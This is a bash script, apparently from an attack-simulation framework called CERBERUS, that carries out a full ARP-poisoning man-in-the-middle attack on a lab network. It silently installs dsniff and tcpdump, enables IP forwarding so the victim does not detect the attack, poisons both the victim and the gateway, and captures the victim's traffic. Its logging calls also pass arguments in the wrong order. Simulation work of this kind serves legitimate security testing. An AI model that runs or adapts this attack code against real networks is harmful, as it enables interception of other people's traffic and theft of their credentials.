#!/bin/bash
# CERBERUS ATTACK MODULE: ARP POISONING (MITM)
# Requirement: "Simulation d'attaque interne (sniffing ARP)"

if [ -d "/app/reports" ]; then LOG_DIR="/app/reports"; else LOG_DIR="./reports"; fi
LOG_FILE="$LOG_DIR/audit_$(date +%F).log"

log_event() {
    TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    echo "{\"timestamp\": \"$TIMESTAMP\", \"event_type\": \"$1\", \"severity\": \"$2\", \"target\": \"172.20.0.20\", \"message\": \"$3\", \"threat_score\": $4}" >> "$LOG_FILE"
}

# CHECK DEPENDENCIES
# we need 'dsniff' (for arpspoof) and 'tcpdump'.
# If missing, we install them silently to ensure the framework works.
if ! command -v arpspoof >/dev/null 2>&1; then
    echo "[*] Initializing Attack Tools (Installing dsniff)..."
    apt-get update >/dev/null 2>&1 && apt-get install -y dsniff tcpdump >/dev/null 2>&1
fi

clear
echo "========================================================"
echo " CERBERUS: INTERNAL ATTACK SIMULATION (ARP)"
echo "========================================================"
echo "[*] TARGET (Victim):  172.20.0.20"
echo "[*] GATEWAY (Router): 172.20.0.1"
echo "--------------------------------------------------------"

# ENABLE IP FORWARDING
# without this the victim loses connection and the attack is detected immediately
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "[+] IP Forwarding Enabled (Traffic flows through us)"

# LAUNCH THE ATTACK
echo -e "\033[1;31m[!] LAUNCHING MITM ATTACK & SNIFFER...\033[0m"
log_event "ATTACK_START" "ARP Poisoning initiated (MITM)" "CRITICAL" 90

# poison the victim
arpspoof -i eth0 -t 172.20.0.20 172.20.0.1 > /dev/null 2>&1 &
PID_1=$!

# poison the router
arpspoof -i eth0 -t 172.20.0.1 172.20.0.20 > /dev/null 2>&1 &
PID_2=$!

# sniff the stolen traffic
# we only show traffic not coming from us to reduce noise
tcpdump -i eth0 host 172.20.0.20 and not port 22 -n &
PID_DUMP=$!

echo "--------------------------------------------------------"
echo "    [ACTIVE] Intercepting traffic..."
echo "    Press ENTER to stop the attack and restore network."
read -r _

echo "[*] Stopping Attack..."
kill $PID_1 $PID_2 $PID_DUMP > /dev/null 2>&1
wait $PID_DUMP 2>/dev/null

# disable IP forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward

log_event "ATTACK_STOP" "ARP Poisoning terminated. Network restored." "INFO" 0

echo "[+] Network Restored. Logs saved."
echo "========================================================"
read -p "Press Enter to return..."